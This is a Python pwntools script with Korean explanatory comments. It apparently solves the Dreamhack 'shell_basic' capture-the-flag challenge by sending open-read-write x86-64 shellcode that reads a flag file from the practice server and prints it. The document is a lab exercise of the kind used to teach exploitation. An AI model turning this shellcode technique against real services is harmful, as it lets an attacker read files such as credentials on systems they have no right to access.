from pwn import *

# 1. 접속 정보 설정 (nc host port)
p = remote('host8.dreamhack.games', 14776) # 포트번호는 문제 페이지 참조

context.arch = 'amd64' # x86-64 아키텍처 설정

# 2. 플래그 파일 경로
filename = "/home/shell_basic/flag_name_is_loooooong"

# 3. ORW 쉘코드 작성 (pwntools가 다 해줍니다)
# open(filename) -> rax에 파일 디스크립터(fd)가 리턴됨
shellcode = shellcraft.open(filename)

# read(fd, buffer, length)
# open의 결과인 rax를 첫 번째 인자로 사용, rsp(스택)에 데이터 저장
shellcode += shellcraft.read('rax', 'rsp', 0x100)

# write(stdout, buffer, length)
# 1은 stdout, 스택(rsp)에 있는 데이터를 출력
shellcode += shellcraft.write(1, 'rsp', 0x100)

# 4. 쉘코드 전송
p.recvuntil("shellcode: ")
p.sendline(asm(shellcode))

# 5. 결과 확인
print(p.recvall())